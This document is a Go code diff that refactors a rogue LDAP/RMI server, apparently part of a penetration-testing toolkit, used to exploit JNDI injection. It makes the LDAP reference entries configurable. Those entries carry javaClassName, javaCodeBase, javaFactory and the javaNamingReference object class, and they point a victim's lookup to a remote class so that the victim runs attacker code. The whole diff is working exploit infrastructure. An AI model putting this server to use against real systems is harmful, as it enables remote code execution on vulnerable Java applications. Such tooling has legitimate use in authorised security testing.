@@ -24,7 +24,7 @@ type FacadeServer struct {
 	ReverseAddr string
 
 	rmiResourceAddrs           map[string]string
-	ldapResourceAddrs          map[string]string
+	ldapResourceAddrs          map[string]map[string]any
 	httpResource               map[string]*HttpResource
 	handlers                   []func(notification *Notification)
 	RemoteAddrConvertorHandler func(string) string
@@ -36,14 +36,25 @@ type FacadeServer struct {
 type FactoryFun func() string
 type FacadeServerConfig func(f *FacadeServer)
 
+func SetLdapResponseEntry(token string, data map[string]any) FacadeServerConfig {
+	return func(f *FacadeServer) {
+		f.ldapResourceAddrs[token] = data
+	}
+}
 func SetJavaClassName(name string) FacadeServerConfig {
 	return func(f *FacadeServer) {
 		f.ldapEntry["javaClassName"] = name
 	}
 }
+
 func SetLdapResourceAddr(name string, addr string) FacadeServerConfig {
 	return func(f *FacadeServer) {
-		f.ldapResourceAddrs[name] = addr
+		f.ldapResourceAddrs[name] = map[string]any{
+			"javaClassName": name,
+			"javaCodeBase":  addr,
+			"javaFactory":   name,
+			"objectClass":   "javaNamingReference",
+		}
 	}
 }
 func SetJavaCodeBase(codeBase string) FacadeServerConfig {
@@ -140,7 +151,7 @@ func NewFacadeServer(host string, port int, configs ...FacadeServerConfig) *Faca
 		ldapEntry:         make(map[string]interface{}),
 		httpResource:      make(map[string]*HttpResource),
 		rmiResourceAddrs:  make(map[string]string),
-		ldapResourceAddrs: make(map[string]string),
+		ldapResourceAddrs: make(map[string]map[string]any),
 		httpMux:           &sync.Mutex{},
 	}
 	for _, config := range configs {
@@ -306,29 +317,24 @@ WRAPPER:
 			//className := "cmd_" + randStr(8)
 			//addr := fmt.Sprintf("http://%s/%s.class", peekableConn.RemoteAddr(), f.resourceName)
 			e := ldapserver.NewSearchResultEntry(fmt.Sprintf("dc=%s,dc=com", "tmp"))
-			var javaCodeBase string
-			for name, addr := range f.ldapResourceAddrs {
-				if name == reqResource {
-					javaCodeBase = addr
-				}
-			}
-
-			if javaCodeBase == "" {
+			var entry map[string]any
+			if v, ok := f.ldapResourceAddrs[reqResource]; ok {
+				entry = v
+			} else {
 				f.triggerNotificationEx("ldap_flag", conn, reqResource, nil, "<empty>")
 				return
 			}
-			e.AddAttribute("javaClassName", message.AttributeValue(reqResource)) //类名，可以任意
-			e.AddAttribute("javaCodeBase", message.AttributeValue(javaCodeBase)) // CodeBase
-			e.AddAttribute("javaFactory", message.AttributeValue(reqResource))   //Factory名，必须和http resource名一致
-			e.AddAttribute("objectClass", "javaNamingReference")                 //objectClass
-			//e.AddAttribute("javaClassName", "foo")
-			//e.AddAttribute("javaCodeBase", message.AttributeValue(addr))
-			//e.AddAttribute("objectClass", "javaNamingReference")
-			//e.AddAttribute("javaFactory", message.AttributeValue(className))
+			for k, v := range entry {
+				e.AddAttribute(message.AttributeDescription(k), message.AttributeValue(utils.InterfaceToString(v))) //类名，可以任意
+			}
 			writer.Write(e)
-			f.triggerNotificationEx("ldap_flag", conn, reqResource, nil, fmt.Sprintf("javaCodeBase: %s", javaCodeBase))
 			res := ldapserver.NewSearchResultDoneResponse(ldapserver.LDAPResultSuccess)
 			writer.Write(res)
+			if v, ok := entry["javaCodeBase"]; ok {
+				f.triggerNotificationEx("ldap_flag", conn, reqResource, nil, fmt.Sprintf("javaCodeBase: %v", v))
+			} else {
+				f.triggerNotificationEx("ldap_flag", conn, reqResource, nil, fmt.Sprintf("%v", entry))
+			}
 		})
 		server.Handle(routes)
 		cli, err := server.NewClient(peekableConn)
